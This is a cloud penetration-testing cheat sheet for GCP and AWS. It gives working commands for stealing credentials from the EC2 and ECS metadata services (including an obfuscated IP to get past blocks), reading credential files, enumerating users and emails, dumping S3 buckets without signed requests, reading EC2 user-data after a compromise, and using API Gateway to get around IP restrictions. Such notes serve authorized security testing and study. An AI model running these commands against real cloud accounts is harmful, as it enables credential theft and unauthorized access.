# cloud
- Cloud Metadata: https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b
- Tools: RhinoSecurityLabs/pacu

## gcp
- `gcloud auth activate-service-account --key-file keys.json`
- list machines: `gcloud compute instances list`
- ssh machine: `gcloud compute ssh $INSTANCE`
- list bucket: `gsutil ls gs://bucket1/`
- https://medium.com/@tomaszwybraniec/google-cloud-platform-pentest-notes-service-accounts-b960dc59d93a

## aws basics
- It's not possible as an IAM User to identify the root email address of the account you're in. However, if the AWS Account is a member of an AWS organization, you can discover the email address of the Organization's Master Account. Try it with this command:

`aws organizations describe-organization`


- the Everyone principal ("*") could mean anyone on the internet or any AWS Customer

- Actions consist of a service and an API call. Some examples are:
```
ec2:StopInstance
s3:GetObject
iam:ListUsers
```

- if a policy deny an access, then the action will be denied
- else if there is an allow, the action will be allowed
- else the action will be denied

- There are two types of access keys: Long Term and Temporary Session keys.

- Long-term access keys begin with the string AKIA. They do not expire.
- Users can only have two Access Keys at one time
- Session keys begin with ASIA and have an expiration date

### vpc and security groups
- Security Groups are attached to specific resources, such as an EC2 Instance or RDS Database.
- Security Groups are the primary way network-level access is managed for resources
- preferable than NACLs because this one are applied to an entire subnet, so NACLs have a high-blast radius if misconfigured.
- Resources inside a VPC (ec2, rds db, ...) can be protected via NACLs & Security groups, and you can prevent anyone from having direct access to them. Resources outside the VPC (s3, lambda, ...) are protected only by IAM.

### unauthenticated enumeration
- checking account id of an access key: `aws sts get-access-key-info --access-key-id AKIA...`
- user enumeration (it needs a user wordlist): `quiet_riot --scan 5`
- email enumeration (it needs a email wordlist): `quiet_riot --scan 4`

### getting creds
- EC2: IMDS - 169.254.169.254
    - if ip is blocked, try another notation
    - for IMDSv2, it is needed to get an API token
        * `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")`
        * `curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
- Lambda: environment variables (AWS_*)
- ECS: Task Metadata Service - found at 169.254.170.2
    - ?http://169.254.170.2/v2/credentials/[UID]
    - http://169.254.170.2/v2/metadata
    - http://169.16689662/latest/user-data
    - fd00:ec2::254
- `~/.aws/credentials`
- `~/.aws/config`
- `~/.aws/cli/cache/{role_session_id}`

### setting creds
```sh
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
# or using a profile
aws configure --profile profileB
aws configure --profile profileB set aws_session_token $AWS_SESSION_TOKEN
# it saves creds in ~/.aws/credentials
```

### checking creds
* `aws sts get-caller-identity`
* `aws sts get-caller-identity --profile profileB`
* ? `aws iam get-user`

## aws services

### s3
- finding s3 bucket of a target
    1) google: `org: target site: s3.amazonaws.com`
    2) looking for links in the target page
    3) dns recon

- list: `aws s3 ls s3://bucket --recursive --no-sign-request`
- dumping s3 bucket: `aws s3 sync s3://{bucket-name} . --no-sign-request`
- getting bucket policy: `aws s3api get-bucket-policy --bucket {bucket-name} --query Policy --output text | jq`
- https://stackoverflow.com/questions/21951372/aws-s3-listbucketresult-pagination-without-authentication

### ec2
- its possible to connect to instances using ec2 serial console, this does not require an agent but a user with a password defined needs to be used

#### post exploitation
- read ec2 config
    * `curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data`
    * or try read `/var/lib/cloud/instance/scripts/part-001`
    * or get list instances (`aws ec2 describe-instances --region us-east-1 --query 'Reservations[].Instances[].InstanceId' --output text --profile two`) then use `aws ec2 describe-instance-attribute --profile two --instance-id "$instance" --attribute userData --output text --query UserData --region us-east-1 | base64 --decode`

### lambda
- In lambda context, AWS encrypts environment variables using Key Management Service (KMS).
- list: `aws lambda list-functions`
- get source code and some infos about the function: `aws lambda get-function --function-name $FUNC_ARN`
- execute: `aws lambda invoke --function-name $FUNC_ARN $OUTOUT_FILE`

### api gateway 
- can be used to bypass ip-based restrictions
- Step: Create an API in API Gateway using the target as the destination. 
- Then: Each time that the api gateway url be requested, a random aws machine will be used to do the request for the target
- Tools: https://github.com/ustayready/fireprox, ip-rotate (bapp)
